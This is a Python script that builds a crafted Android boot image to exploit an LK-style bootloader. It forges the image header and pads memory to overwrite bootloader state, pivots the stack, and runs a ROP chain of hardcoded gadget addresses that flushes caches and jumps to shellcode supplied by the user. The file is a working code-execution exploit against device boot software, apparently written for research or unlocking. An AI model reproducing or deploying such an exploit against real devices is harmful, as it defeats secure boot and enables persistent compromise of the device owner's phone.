import sys
import struct

base = 0x4BD00000

# 0x0000000000050132 : pop {r0, r1, r2, r3, r6, r7, pc}
#pop_r0_r1_r2_r3_r6_r7_pc = base + 0x50132|1
# b5a4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xb5a4

# 0x0000000000018422 : pop {pc}
#pop_pc = base + 0x18422|1
# 249b8:       bd00            pop     {pc}
pop_pc = base + 0x249b8|1

# 0x0000000000025e9a : blx r3 ; movs r0, #0 ; pop {r3, pc}
#blx_r3_pop_r3 = base + 0x25e9a|1
# 150:       4798            blx     r3 ; pop {r3, pc}
blx_r3_pop_r3 = base + 0x150|1


cache_func = base + 0x31444

test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."

invalid = base + 0x3fbb0

forced_addr = 0x45000000 
#inject_addr = base + 0x5C000
inject_addr = forced_addr + 0x10 + 0x1000000
inject_sz = 0x1000

shellcode_addr = forced_addr + 0x100 + 0x1000000
#shellcode_sz = 0x200 # TODO: check size
shellcode_sz = 0x1000 # TODO: check size

# ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
#pivot = 0x4BD43320
# 3088:       0913f04f        ldmdbeq r3, {r0, r1, r2, r3, r6, ip, sp, lr, pc}
pivot = base + 0x3088;


def main():
    with open(sys.argv[1], "rb") as fin:
        #orig = fin.read(0x400)
        #fin.seek(0x800)
        orig = fin.read()

    hdr = bytes.fromhex("414E44524F494421")
    #hdr += struct.pack("<II", 0x6D003C8, forced_addr)
    #hdr += struct.pack("<II", 0x6D003C8, forced_addr)
    #hdr += struct.pack("<II", 0x6D002C8, forced_addr)
    #hdr += struct.pack("<II", 0x6D00390, forced_addr)
    hdr += struct.pack("<II", 0x6D00384, forced_addr)
    hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
    hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
    hdr += b"\x00" * 0xA
    #hdr += b"\x00" * 0x10
    hdr += b"\x00" * 0x1000000
    hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
    hdr += b"\x00" * 0x1C
    hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc

    hdr += b"\x00" * (0xC + 0x4)

    # clean dcache, flush icache, then jump to payload
    chain = [
        pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc,
        shellcode_addr,                              # r0
        shellcode_sz,                                # r1
        0xDEAD,                                      # r2
        cache_func,                                  # r3
        0xDEAD,                                      # r4
        0xDEAD,                                      # r6
        0xDEAD,                                      # r7
        0xDEAD,                                      # r8
        0xDEAD,                                      # ip
        0xDEAD,                                      # lr

        blx_r3_pop_r3,
        0xDEAD,

        shellcode_addr
    ]
    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
    hdr += chain_bin

    want_len = shellcode_addr - inject_addr + 0x40 + 0x10 
    #hdr += b"\x00" * (want_len - len(hdr))
    hdr += b"\x00" * 0x68

    with open(sys.argv[2], "rb") as fin:
        shellcode = fin.read()

    if len(shellcode) > shellcode_sz:
        raise RuntimeError("shellcode too big!")

    hdr += shellcode

    hdr += b"\x00" * (0x400 - len(hdr))

    #hdr += b"\x00" * ((0x6D00040 - len(hdr) - 0x200) + 0x10)
    hdr += b"\x00" * (0x6D00040 - len(hdr) - 0x200)

    hdr += orig

    with open(sys.argv[3], "wb") as fout:
        fout.write(hdr)


if __name__ == "__main__":
    main()
